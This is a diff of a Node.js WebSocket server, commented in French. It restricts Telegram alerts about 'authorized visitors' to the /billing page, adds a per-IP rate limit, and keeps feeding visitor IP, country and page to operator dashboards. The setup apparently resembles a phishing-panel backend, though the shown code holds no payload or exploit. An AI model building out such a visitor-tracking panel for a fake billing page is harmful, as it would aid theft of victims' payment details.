@@ -719,14 +719,33 @@ async function handleRegister(clientId, data) {
   client.ws.send(JSON.stringify(registrationResponse));
   console.log(`[handleRegister] ✅ Registration confirmation sent to ${clientId}`);
 
-  // Notifier Telegram pour les visiteurs autorisés (dès qu'ils visitent le lien)
+  // Notifier Telegram pour les visiteurs autorisés UNIQUEMENT sur la page /billing
   // IMPORTANT: Vérifier que la notification n'a pas déjà été envoyée pour éviter les doublons
   // Ne pas envoyer si on a déjà skip l'enregistrement
-  if (client.role === 'client' && !client.notificationSent && !alreadyRegistered) {
+  // NE PAS envoyer si la page n'est pas /billing
+  const isBillingPage = data.page === '/billing' || client.current_page === '/billing';
+  const shouldNotify = client.role === 'client' && 
+                       !client.notificationSent && 
+                       !alreadyRegistered && 
+                       isBillingPage;
+  
+  if (shouldNotify) {
+    // Vérifier aussi qu'on n'a pas envoyé de notification récemment pour cette IP (protection contre les boucles)
+    const now = Date.now();
+    const lastNotificationTime = client.lastNotificationTime || 0;
+    const timeSinceLastNotification = now - lastNotificationTime;
+    const MIN_NOTIFICATION_INTERVAL = 60000; // 60 secondes minimum entre notifications pour la même IP
+    
+    if (timeSinceLastNotification < MIN_NOTIFICATION_INTERVAL && lastNotificationTime > 0) {
+      console.log(`[handleRegister] ⚠️  Notification skipped - too soon since last notification (${Math.round(timeSinceLastNotification/1000)}s ago) for IP ${client.ip}`);
+      return; // Ne pas envoyer de notification si on vient d'en envoyer une récemment
+    }
+    
     // Marquer IMMÉDIATEMENT que la notification va être envoyée pour éviter les doublons
     // même si plusieurs appels à handleRegister arrivent en même temps
     client.notificationSent = true;
-    console.log(`[handleRegister] 🔔 Sending authorized visitor notification for client ${clientId}`);
+    client.lastNotificationTime = now;
+    console.log(`[handleRegister] 🔔 Sending authorized visitor notification for client ${clientId} on page ${data.page || client.current_page}`);
     
     // Utiliser le pays déjà récupéré lors de la connexion (plus rapide)
     let country = client.country;
@@ -781,6 +800,8 @@ async function handleRegister(clientId, data) {
     }
   } else if (client.role === 'client' && client.notificationSent) {
     console.log(`[handleRegister] ⚠️  Notification already sent for client ${clientId}, skipping Telegram notification...`);
+  } else if (client.role === 'client' && !isBillingPage) {
+    console.log(`[handleRegister] ⚠️  Client ${clientId} is on page '${data.page || client.current_page}', not /billing - skipping notification`);
   }
 
   // Notifier les dashboards (TOUJOURS, même si la notification Telegram a été skip)
